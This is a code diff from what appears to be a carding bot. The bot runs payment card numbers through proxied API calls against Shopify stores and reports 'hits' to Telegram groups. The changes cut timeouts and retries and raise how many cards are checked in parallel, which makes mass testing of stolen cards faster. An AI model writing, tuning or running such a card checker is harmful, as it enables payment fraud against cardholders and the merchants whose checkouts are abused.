@@ -73,10 +73,10 @@ HIT_LOG_GROUP_ID       = -1004361062205   # edit to your group
 EXTRA_CHARGED_GROUP_ID = -1003991915326   # edit to your group
 
 SH_COOLDOWN    = 25
-SITE_RETRIES   = 10    # max sites tried per card before giving up
-SITE_TIMEOUT   = 20    # seconds per API call
-MAX_CONCURRENT = 10    # cards checked in parallel
-CARD_STAGGER   = 0.5   # small stagger between card launches (seconds)
+SITE_RETRIES   = 5     # sites tried per card (dead sites timeout at 6s each → 30s max)
+SITE_TIMEOUT   = 6     # seconds per API call — dead sites hang ~30s, cut them fast
+MAX_CONCURRENT = 15    # cards checked in parallel
+CARD_STAGGER   = 0.3   # stagger between card launches (seconds)
 BUTTON_LOCK    = 30
 
 _CB_RESULT = "mshr"
@@ -1219,17 +1219,22 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
     px         = _proxy_url(proxy)
     url = (f"{API_URL}?cc={card}&site={site_url}&proxy={px}"
            if px else f"{API_URL}?cc={card}&site={site_url}")
-    _to  = aiohttp.ClientTimeout(total=timeout, connect=12, sock_read=timeout)
+    # connect=3 so dead/hung sites fail in 3s not 12s
+    _to  = aiohttp.ClientTimeout(total=timeout, connect=3, sock_read=timeout)
     try:
         async with aiohttp.ClientSession(timeout=_to) as session:
             async with session.get(url, ssl=False) as r:
                 http_st = r.status
                 raw     = await r.text()
+                # Empty body = API couldn't reach the store → treat as 404
+                if not raw or not raw.strip():
+                    return ("site error! status: 404",
+                            "Shopify Payments", "0.00", "USD", http_st)
                 if http_st == 200:
                     try:
                         data = _json.loads(raw)
                     except Exception:
-                        return (raw.strip()[:200] or "Invalid JSON",
+                        return ("site error! status: 404",
                                 "Shopify Payments", "0.00", "USD", http_st)
                     gw       = str(data.get("Gateway")  or data.get("gateway")  or "Shopify Payments")
                     price    = str(data.get("Price")     or data.get("price")    or "0.00")
